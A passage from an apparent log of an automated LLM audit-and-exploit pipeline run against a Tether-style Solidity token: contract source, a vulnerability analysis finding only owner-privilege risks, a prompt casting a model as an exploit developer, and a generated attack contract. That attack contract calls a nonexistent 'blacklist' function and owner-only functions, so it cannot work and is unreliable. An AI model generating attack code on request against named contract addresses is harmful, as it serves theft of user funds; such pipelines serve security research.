AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': "1. **Contract Analysis:**\n\nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Implements pausing/unpausing by owner.\n- Implements blacklisting of addresses by owner, with ability to destroy blacklisted funds.\n- Supports upgradeability via `deprecated` flag and forwarding calls to an upgraded contract.\n- Implements fees on transfers (basis points rate and max fee) adjustable by owner.\n- Owner can mint (`issue`) and burn (`redeem`) tokens.\n- Uses SafeMath for arithmetic safety.\n- Has protections against short address attack via `onlyPayloadSize` modifier.\n- Implements the known ERC20 approve race condition mitigation by requiring allowance to be zero before changing it to a non-zero value.\n- Owner has significant control: can pause/unpause, blacklist/unblacklist users, destroy blacklisted funds, issue and redeem tokens, set fees, and deprecate the contract.\n\nThe contract is written in Solidity version pragma `^0.4.17`.\n\n2. **Vulnerability Assessment:**\n\n- **Centralization / Owner Privileges:**\n  - Owner can arbitrarily blacklist any user and destroy their token balances permanently (`destroyBlackFunds`).\n  - Owner can pause all token transfers (`pause`), effectively freezing user funds.\n  - Owner can mint unlimited tokens (`issue`), inflating supply and diluting holders.\n  - Owner can burn tokens from their own balance (`redeem`).\n  - Owner can deprecate the contract and redirect calls to an upgraded contract, which could be malicious.\n  \n  **Impact:** High trust required in owner. Malicious or compromised owner can censor users, confiscate tokens, inflate supply, or redirect users to malicious upgraded contracts.\n\n- **No ETH Handling / No Reentrancy:**\n  - The contract does not hold or manage ETH, so no reentrancy or ETH theft risks.\n  \n- **Approve Race Condition Mitigation:**\n  - The contract enforces allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **Fee Parameters Limits:**\n  - Owner can set fees but capped at 0.2% (basisPointsRate < 20) and max fee < 50 tokens (adjusted by decimals).\n  - This prevents excessive fees but still allows some fee extraction by owner.\n\n- **Upgradeability Risks:**\n  - The `deprecated` flag and `upgradedAddress` allow owner to redirect token operations to a new contract.\n  - No on-chain governance or user consent required.\n  - The upgraded contract could have arbitrary code, potentially malicious.\n  \n  **Impact:** Owner can replace token logic arbitrarily, potentially stealing tokens or locking users out.\n\n- **BlackList Mechanism:**\n  - Blacklisted users cannot transfer tokens.\n  - Owner can destroy blacklisted users' tokens.\n  \n  **Impact:** Owner can censor and confiscate tokens from any user.\n\n- **No Event Emission on Ownership Transfer:**\n  - `transferOwnership` does not emit an event.\n  \n  **Impact:** Minor, but reduces transparency.\n\n- **Use of Deprecated Solidity Version:**\n  - Solidity 0.4.17 is very old and lacks many modern safety features.\n  \n  **Impact:** Potential for subtle bugs or incompatibilities, but no direct vulnerability found here.\n\n3. **Exploitation Requirements:**\n\n- Exploitation requires control of the **owner** account.\n- If attacker gains owner private key or if owner is malicious, they can:\n  - Blacklist any user and destroy their tokens.\n  - Pause the contract to freeze transfers.\n  - Mint unlimited tokens to themselves.\n  - Deprecate the contract and redirect to malicious upgraded contract.\n- No direct user-exploitable bugs or reentrancy issues found.\n- No setup required other than owner compromise.\n\n---\n\n**Summary:**\n\n- **Solidity Version:** pragma solidity ^0.4.17\n- **Main Vulnerabilities:** Centralization risks due to extensive owner privileges (blacklisting, minting, pausing, upgradeability).\n- **No technical bugs like reentrancy or math errors found.**\n- **Users must trust owner not to abuse powers.**", 'contract_analysis': '**\n\nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Implements pausing/unpausing by owner.\n- Implements blacklisting of addresses by owner, with ability to destroy blacklisted funds.\n- Supports upgradeability via `deprecated` flag and forwarding calls to an upgraded contract.\n- Implements fees on transfers (basis points rate and max fee) adjustable by owner.\n- Owner can mint (`issue`) and burn (`redeem`) tokens.\n- Uses SafeMath for arithmetic safety.\n- Has protections against short address attack via `onlyPayloadSize` modifier.\n- Implements the known ERC20 approve race condition mitigation by requiring allowance to be zero before changing it to a non-zero value.\n- Owner has significant control: can pause/unpause, blacklist/unblacklist users, destroy blacklisted funds, issue and redeem tokens, set fees, and deprecate the contract.\n\nThe contract is written in Solidity version pragma `^0.4.17`.\n\n2. **', 'vulnerability_assessment': "**\n\n- **Centralization / Owner Privileges:**\n  - Owner can arbitrarily blacklist any user and destroy their token balances permanently (`destroyBlackFunds`).\n  - Owner can pause all token transfers (`pause`), effectively freezing user funds.\n  - Owner can mint unlimited tokens (`issue`), inflating supply and diluting holders.\n  - Owner can burn tokens from their own balance (`redeem`).\n  - Owner can deprecate the contract and redirect calls to an upgraded contract, which could be malicious.\n  \n  **Impact:** High trust required in owner. Malicious or compromised owner can censor users, confiscate tokens, inflate supply, or redirect users to malicious upgraded contracts.\n\n- **No ETH Handling / No Reentrancy:**\n  - The contract does not hold or manage ETH, so no reentrancy or ETH theft risks.\n  \n- **Approve Race Condition Mitigation:**\n  - The contract enforces allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **Fee Parameters Limits:**\n  - Owner can set fees but capped at 0.2% (basisPointsRate < 20) and max fee < 50 tokens (adjusted by decimals).\n  - This prevents excessive fees but still allows some fee extraction by owner.\n\n- **Upgradeability Risks:**\n  - The `deprecated` flag and `upgradedAddress` allow owner to redirect token operations to a new contract.\n  - No on-chain governance or user consent required.\n  - The upgraded contract could have arbitrary code, potentially malicious.\n  \n  **Impact:** Owner can replace token logic arbitrarily, potentially stealing tokens or locking users out.\n\n- **BlackList Mechanism:**\n  - Blacklisted users cannot transfer tokens.\n  - Owner can destroy blacklisted users' tokens.\n  \n  **Impact:** Owner can censor and confiscate tokens from any user.\n\n- **No Event Emission on Ownership Transfer:**\n  - `transferOwnership` does not emit an event.\n  \n  **Impact:** Minor, but reduces transparency.\n\n- **Use of Deprecated Solidity Version:**\n  - Solidity 0.4.17 is very old and lacks many modern safety features.\n  \n  **Impact:** Potential for subtle bugs or incompatibilities, but no direct vulnerability found here.\n\n3. **", 'exploitation_requirements': '**\n\n- Exploitation requires control of the **owner** account.\n- If attacker gains owner private key or if owner is malicious, they can:\n  - Blacklist any user and destroy their tokens.\n  - Pause the contract to freeze transfers.\n  - Mint unlimited tokens to themselves.\n  - Deprecate the contract and redirect to malicious upgraded contract.\n- No direct user-exploitable bugs or reentrancy issues found.\n- No setup required other than owner compromise.', 'analysis_duration': 17.20576500892639}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: **\n\nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Implements pausing/unpausing by owner.\n- Implements blacklisting of addresses by owner, with ability to destroy blacklisted funds.\n- Supports upgradeability via `deprecated` flag and forwarding calls to an upgraded contract.\n- Implements fees on transfers (basis points rate and max fee) adjustable by owner.\n- Owner can mint (`issue`) and burn (`redeem`) tokens.\n- Uses SafeMath for arithmetic safety.\n- Has protections against short address attack via `onlyPayloadSize` modifier.\n- Implements the known ERC20 approve race condition mitigation by requiring allowance to be zero before changing it to a non-zero value.\n- Owner has significant control: can pause/unpause, blacklist/unblacklist users, destroy blacklisted funds, issue and redeem tokens, set fees, and deprecate the contract.\n\nThe contract is written in Solidity version pragma `^0.4.17`.\n\n2. **\n\nVulnerability Assessment: **\n\n- **Centralization / Owner Privileges:**\n  - Owner can arbitrarily blacklist any user and destroy their token balances permanently (`destroyBlackFunds`).\n  - Owner can pause all token transfers (`pause`), effectively freezing user funds.\n  - Owner can mint unlimited tokens (`issue`), inflating supply and diluting holders.\n  - Owner can burn tokens from their own balance (`redeem`).\n  - Owner can deprecate the contract and redirect calls to an upgraded contract, which could be malicious.\n  \n  **Impact:** High trust required in owner. Malicious or compromised owner can censor users, confiscate tokens, inflate supply, or redirect users to malicious upgraded contracts.\n\n- **No ETH Handling / No Reentrancy:**\n  - The contract does not hold or manage ETH, so no reentrancy or ETH theft risks.\n  \n- **Approve Race Condition Mitigation:**\n  - The contract enforces allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **Fee Parameters Limits:**\n  - Owner can set fees but capped at 0.2% (basisPointsRate < 20) and max fee < 50 tokens (adjusted by decimals).\n  - This prevents excessive fees but still allows some fee extraction by owner.\n\n- **Upgradeability Risks:**\n  - The `deprecated` flag and `upgradedAddress` allow owner to redirect token operations to a new contract.\n  - No on-chain governance or user consent required.\n  - The upgraded contract could have arbitrary code, potentially malicious.\n  \n  **Impact:** Owner can replace token logic arbitrarily, potentially stealing tokens or locking users out.\n\n- **BlackList Mechanism:**\n  - Blacklisted users cannot transfer tokens.\n  - Owner can destroy blacklisted users' tokens.\n  \n  **Impact:** Owner can censor and confiscate tokens from any user.\n\n- **No Event Emission on Ownership Transfer:**\n  - `transferOwnership` does not emit an event.\n  \n  **Impact:** Minor, but reduces transparency.\n\n- **Use of Deprecated Solidity Version:**\n  - Solidity 0.4.17 is very old and lacks many modern safety features.\n  \n  **Impact:** Potential for subtle bugs or incompatibilities, but no direct vulnerability found here.\n\n3. **\n\nExploitation Requirements: **\n\n- Exploitation requires control of the **owner** account.\n- If attacker gains owner private key or if owner is malicious, they can:\n  - Blacklist any user and destroy their tokens.\n  - Pause the contract to freeze transfers.\n  - Mint unlimited tokens to themselves.\n  - Deprecate the contract and redirect to malicious upgraded contract.\n- No direct user-exploitable bugs or reentrancy issues found.\n- No setup required other than owner compromise.\n\n\nTarget Contract Address: 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': '```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function pause() external;\n    function issue(uint256 amount) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, uint256 mintAmount, address upgradedAddress) public {\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.pause();\n        target.issue(mintAmount);\n        target.deprecate(upgradedAddress);\n    }\n}\n```', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function pause() external;\n    function issue(uint256 amount) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, uint256 mintAmount, address upgradedAddress) public {\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.pause();\n        target.issue(mintAmount);\n        target.deprecate(upgradedAddress);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.9425463676452637}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpi6hdzhyj.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return 